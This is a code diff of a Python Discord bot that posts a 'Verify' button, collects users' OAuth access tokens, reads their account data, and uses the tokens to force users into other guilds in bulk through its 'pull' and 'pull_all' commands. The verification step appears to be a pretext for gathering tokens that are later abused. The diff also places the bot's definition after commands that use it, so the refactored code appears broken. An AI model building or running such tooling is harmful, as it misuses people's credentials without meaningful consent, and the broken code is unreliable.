@@ -1,12 +1,8 @@
-import discord
-import json
-import requests
-import os 
-import time
-from pystyle import Colors
-from discord import ButtonStyle
-from discord.ui import Button
-from discord.ext import commands
+import discord, json, requests, os, time
+from pystyle import *
+from discord import *
+from discord.ui import *
+from discord.ext import commands, tasks
 import threading
 
 def process_user(x, token, guild_id, allowed, failed):
@@ -21,37 +17,8 @@ def get_user_data(token):
     headers = {
         "Authorization" : f"Bearer {token}"
     }
-    r = requests.get("https://discord.com/api/v8/users/@me", headers = headers)
+    r = requests.get(f"https://discord.com/api/v8/users/@me", headers = headers)
     return r.json()
-
-def pull_to_guild(bot_token, token, guild_id, id):
-    
-    data = {
-        "access_token" : token
-    }
-    headers = {
-        "Authorization" : f"Bot {bot_token}",
-        'Content-Type': 'application/json'
-
-    }
-    r = requests.put(f'https://discord.com/api/v8/guilds/{guild_id}/members/{id}',
-                      headers=headers, json=data).json()
-    return r
-
-os.system('cls')
-with open("saved.json", "r+") as a:
-    print("[...] Checking for tokens")
-    aa = json.load(a)
-    if aa['config']['bot_token'] == "":
-        token = input(f"{Colors.light_blue}[>] {Colors.blue}Bot token: ")
-
-    else:
-        token = aa['config']['bot_token']
-    role_id = input(f"{Colors.light_blue}[>] {Colors.blue}Enter Role id: ")
-    client_id = input(f"{Colors.light_blue}[>] {Colors.blue}Enter client id: ")
-    url_hosted = input(f"{Colors.light_blue}[>] {Colors.blue}Enter URL you're hosting with if testing locally type (http://localhost:8080): ")
-
-bot = commands.Bot(command_prefix="-", help_command=None, intents=discord.Intents.all())
 @bot.command()
 async def active_users(ctx):
     with open("saved.json", "r+") as b:
@@ -67,7 +34,7 @@ async def active_users(ctx):
             except Exception as e:
                 print(e)
                 pass
-        await ctx.send(embed=discord.Embed)
+        await ctx.send(embed=embed)
 @bot.command()
 async def user(ctx, token):
     try:
@@ -89,18 +56,43 @@ async def user(ctx, token):
     except Exception as e:
         print(e)
         embed=discord.Embed(title="Failed", description="Failed to fetch user's data") 
-    await ctx.send(embed=discord.Embed)
+    await ctx.send(embed=embed)
+def pull_to_guild(bot_token, token, guild_id, id):
+    
+    data = {
+        "access_token" : token
+    }
+    headers = {
+        "Authorization" : f"Bot {bot_token}",
+        'Content-Type': 'application/json'
+
+    }
+    r = requests.put(f'https://discord.com/api/v8/guilds/{guild_id}/members/{id}', headers=headers, json=data).json()
+    return r
+
+os.system('cls')
+with open("saved.json", "r+") as a:
+    print("[...] Checking for tokens")
+    aa = json.load(a)
+    if aa['config']['bot_token'] == "":
+        token = input(f"{Colors.light_blue}[>] {Colors.blue}Bot token: ")
+
+    else:
+        token = aa['config']['bot_token']
+    role_id = input(f"{Colors.light_blue}[>] {Colors.blue}Enter Role id: ")
+    client_id = input(f"{Colors.light_blue}[>] {Colors.blue}Enter client id: ")
+    url_hosted = input(f"{Colors.light_blue}[>] {Colors.blue}Enter URL you're hosting with if testing locally type (http://localhost:8080): ")
+
+bot = commands.Bot(command_prefix="-", help_command=None, intents=discord.Intents.all())
+
 @bot.command()
 async def pull(ctx, token2, guild_id, uid):
     try:
         a = pull_to_guild(token, token2, guild_id, uid)
         print(a)
-        await ctx.send(embed=discord.Embed(title="Pulled user", 
-                                           description="Sucessfully added the user to the guild!"))
-    except Exception as e:
-        print(e)
-        await ctx.send(embed=discord.Embed(title="Failed to pull user",
-                                            description="This didn't seem to work :(!"))
+        await ctx.send(embed=Embed(title="Pulled user", description=f"Sucessfully added the user to the guild!"))
+    except:
+        await ctx.send(embed=Embed(title="Failed to pull user", description=f"This didn't seem to work :(!"))
 
 @bot.command()
 async def pull_all(ctx, guild_id):
@@ -119,16 +111,14 @@ async def pull_all(ctx, guild_id):
         for t in threads:
             t.join()
         end = time.time()
-        await ctx.send(embed=discord.Embed(title="Pull summary", 
-                                           description=f"**Auth tokens pulled to guild:** {allowed}\n**Failed to pull:** {failed}\n**Time taken:** `{end-start} seconds`",
-                                             color=discord.Color.blurple()))
+        await ctx.send(embed=Embed(title="Pull summary", description=f"**Auth tokens pulled to guild:** {allowed}\n**Failed to pull:** {failed}\n**Time taken:** `{end-start} seconds`", color=discord.Color.blurple()))
 
          
 
 
 @bot.command()
 async def setup(ctx, channel:int = None):
-    if channel is None:
+    if channel == None:
         button = Button(
             style=ButtonStyle.link,
             label="Verify",
@@ -160,10 +150,7 @@ async def setup(ctx, channel:int = None):
             f.truncate(0)
             f.seek(0)
             json.dump(ff, f, indent=4)
-        await a.send(embed=discord.Embed(title="Verify",
-         description="Click the button below to verify in this server!"), view=vie)
+        await a.send(embed=Embed(title="Verify", description="Click the button below to verify in this server!"), view=vie)
 
-
-    await ctx.reply(embed=discord.Embed(title="Created",
-     description=f"Sucessfully set up verification in <#{a.id}>! All logs will be sent to <#{b1}>"))
+    await ctx.reply(embed=Embed(title=f"Created", description=f"Sucessfully set up verification in <#{a.id}>! All logs will be sent to <#{b1}>"))
 bot.run(token)
